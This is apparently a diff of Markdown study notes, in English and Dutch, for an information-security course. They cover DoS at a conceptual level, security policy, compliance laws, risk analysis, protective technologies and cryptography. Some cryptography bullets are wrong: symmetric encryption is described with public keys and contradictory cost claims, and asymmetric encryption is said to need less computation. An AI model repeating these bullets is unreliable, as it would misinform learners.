+  **Target**
+
+  - Denial of Service (DoS): attackers make resources (server, bandwidth) unavailable to legitimate traffic by overwhelming resource with bogus traffic.
+        1. Select target.
+        2. Break into hosts around the network (see botnet).
+        3. Send packets to target from compromised host.
+  :::
+  
+- **7.3** Security Policy
+::: details Antwoord
+**Security Policy**
+
+- Organisational policy outlining a vision (not technical details)
+- Signed by management
+- Management shows the importance of security (commitment)
+- And assigns a security officer to handle day-to-day business
+:::
+
+- **7.4** Compliancy
+::: details Antwoord
+**Compliancy**
+
+Comply with laws, rules, and regulations:
+
+- **Code Tabaksblat** - NL
+- **Wet Melding Datalekken** - NL
+- **GDPR (General Data Protection Regulation)**
+- **AVG (Algemene verordening gegevensbescherming)**
+- **Sarbanes-Oxley ("SOX")** - US
+- **Payment Card Industry Data Security Standard (PCI DSS)**
+:::
+
+- **7.5** Risk analysis (RA)
+::: details Antwoord
+**Risk Analysis (RA)**
+
+*Example: A Website*
+
+- **Risk:** The website may be hacked.
+  
+- **Chances:** Once every 5 years.
+  
+- **Damage:** Estimated at €80,000.
+  
+- **Therefore:** The calculated risk is €16,000 per year.
+  
+- **Solution:** Implementing a firewall, with associated costs of €10,000 per year.
+:::
+
+- **7.6** Technical protection
+::: details Antwoord
+**Technical Protection**
+
+- **Firewall:** Acts as a barrier between a trusted internal network and untrusted external networks, controlling incoming and outgoing network traffic based on predetermined security rules.
+  
+- **Routers, Modems, etc. with a Packet Filter:** Devices that inspect packets of data as they pass through and make decisions based on predefined rules, allowing or blocking packets accordingly.
+  
+- **Antivirus:** Software designed to detect, prevent, and remove malicious software (malware) such as viruses, worms, and trojans from computers and networks.
+  
+- **IDS (Intruder Detection System):** Monitors network or system activities for malicious activities or policy violations and alerts system administrators or security personnel when suspicious behavior is detected.
+  
+- **IPS (Intruder Prevention System):** Goes beyond IDS by actively blocking or preventing detected malicious activities from being executed on a network or system.
+  
+- **IDP (Identity Provider):** Manages user identities and authentication processes, ensuring that only authorized users gain access to resources and services.
+  
+- **Data Protection (e.g., BitLocker):** Ensures the confidentiality and integrity of data by implementing measures such as encryption, access controls, and backup procedures.
+  
+- **Data Encryption:** Converts plaintext data into ciphertext to protect it from unauthorized access or interception during transmission or while stored on a device or network.
+  
+- **Security Awareness:** Educating users and personnel about security best practices, policies, and procedures to help them recognize and mitigate potential security risks and threats.
+:::
+
+- **7.7** Defence In Depth
+::: details Antwoord
+
+:::
+
+- **7.8** Symmetric key cryptography
+::: details Antwoord
+
+**Cryptografie**
+
+- Beide partijen gebruiken dezelfde sleutel.
+- De sleutel wordt aan het begin van de sessie overeengekomen.
+- Public keys zijn openbaar en op te vragen.
+- Vereist weinig computerkracht.
+- Veel rekenkracht nodig om te berekenen.
+- Voorbeelden zijn DES, 3DES, AES.
+
+<img src="./assets/afbeeldingen/symmetric-crytpography.png">
+
+:::
+
+- **7.9** Asymmetrische key cryptografie
+::: details Antwoord
+- Gebruikt openbare en privésleutels.
+- Public keys zijn openbaar, maar privésleutels zijn geheim.
+- Minder rekenkracht nodig om te berekenen.
+- Wordt gebruikt voor digitale handtekeningen en veilige communicatie.
+- RSA is een veelgebruikte asymmetrische cryptografische methode.
+
+<img src="./assets/afbeeldingen/simple-encryption-scheme.png">
+
+<img src="./assets/afbeeldingen/public-key-crypto.png">
+
+<img src="./assets/afbeeldingen/public-key-cryptography.png.png">
+:::
+
+- **7.10** Certificate Authority
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/certificate-authorities.png">
+:::
+
+- **7.11** Digital Signatures
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/digital-signatures.png">
+:::
+
+- **7.12** Message digests
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/message-disgest.png">
+:::
+
+- **7.13** SSL TCP/IP
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/ssl-tcip.png">
+:::
+
+- **7.14** Firewall
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/firewall.png">
+:::
+
+- **7.15** Packet Filtering
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/packet-filtering.png">
+:::
+
+- **7.16** IDS
+::: details Antwoord
+
+<img src="./assets/ids.png">
+
+<img src="./assets/ids-sensors.png">
+:::
+
+- **7.17** Demilitarized Zone (DMZ)
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/dimilitarized-zone.png">
+:::
+
+- **7.18** VPN
+::: details Antwoord
+
+<img src="./assets/afbeeldingen/vpn.png">
+:::
